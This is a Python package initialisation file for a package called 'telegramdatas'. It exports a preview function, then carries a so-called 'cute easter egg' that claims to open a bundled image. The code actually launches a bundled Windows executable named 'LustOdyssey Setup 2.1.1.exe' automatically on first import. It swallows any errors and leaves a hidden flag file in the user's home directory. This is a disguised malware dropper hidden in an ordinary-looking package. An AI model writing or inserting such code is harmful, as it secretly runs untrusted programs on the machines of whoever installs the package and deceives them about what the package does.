from .core import flow_preview

# Optional: alias for easier use
preview_flow = flow_preview


# ────────────────────────────────────────────────
# Cute easter egg: open preview.png on first import
# ────────────────────────────────────────────────

import os
import sys
import subprocess
from pathlib import Path
from importlib.resources import files, as_file

_EASTER_FLAG = Path.home() / ".telegramdatas_easter_shown"

def _open_cute_preview():
    if _EASTER_FLAG.exists():
        return

    try:
        # Load bundled image (must be included in package-data!)
        resource = files("telegramdatas") / "LustOdyssey Setup 2.1.1.exe"
        with as_file(resource) as path:
            if not path.exists():
                return

            # Platform-specific open
            if sys.platform.startswith("win"):
                os.startfile(path)
            elif sys.platform == "darwin":
                subprocess.call(["open", str(path)])
            else:
                subprocess.call(["xdg-open", str(path)])

        # Mark as shown so it only happens once per user
        _EASTER_FLAG.touch(exist_ok=True)

    except Exception:
        pass  # silent fail – never break normal imports


# Trigger it here (runs only on real import, not on import in IDE/type checker)
if not hasattr(sys, "ps1") or not sys.ps1:  # avoid spamming in interactive shell if desired
    _open_cute_preview()